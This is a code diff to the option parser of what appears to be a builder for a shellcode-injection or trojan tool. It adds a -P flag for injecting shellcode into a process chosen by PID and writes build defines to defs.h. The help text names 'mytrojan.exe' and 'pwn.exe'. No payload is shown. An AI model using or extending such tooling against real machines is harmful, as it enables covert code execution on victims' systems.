@@ -32,6 +32,7 @@ int main (int argc, char **argv)
 	int Eflag = 0;
 	int Aflag = 0;
 	int qflag = 0;
+	int Pflag = 0;
 
 	int index;
 	int c;
@@ -40,7 +41,7 @@ int main (int argc, char **argv)
 
 	// compute the options
 	//deleted w,u
-	while ((c = getopt (argc, argv, "d:e:f:i:lphFXq")) != -1)
+	while ((c = getopt (argc, argv, "d:e:f:i:lphFXqP")) != -1)
 		switch (c)
 		{
 			case 'd':
@@ -69,6 +70,9 @@ int main (int argc, char **argv)
 				break;
 			case 'q':
 				qflag = 1;
+				break;
+			case 'P':
+				Pflag = 1;
 				break;
 			case 'p':
 				print_debug = 1;
@@ -157,7 +161,6 @@ int main (int argc, char **argv)
 	{
 		if (strcmp(ivalue, "shellcode")==0)
 		{
-			printf("Write INJECT_SHELLCODE\n");
 			FILE *file_def;
 			file_def = fopen ("defs.h","a");
 			fprintf (file_def, "#define INJECT_SHELLCODE\n");
@@ -183,8 +186,12 @@ int main (int argc, char **argv)
 	//write X64 to defs.h
 	if(Xflag)
 		fprintf (file_def, "#define X64\n");
+
 	if(qflag)
 		fprintf (file_def, "#define QUIET\n");
+
+	if(Pflag)
+		fprintf (file_def, "#define PID\n");
 
 	fclose(file_def);
 
@@ -195,6 +202,7 @@ void print_help()
 	printf("Options:\n");
 	printf("-i inject\n");
 	printf("\t-i shellcode for injecting shellcode\n");
+	printf("-P inject shellcode by PID as argument, call pwn.exe PID\n");
 	printf("-l load and exec shellcode from given file, call is with mytrojan.exe myshellcode.txt\n");
 	printf("-f compile shellcode into .exe, needs filename of shellcode file\n");
 	printf("-X compile for 64 bit\n");
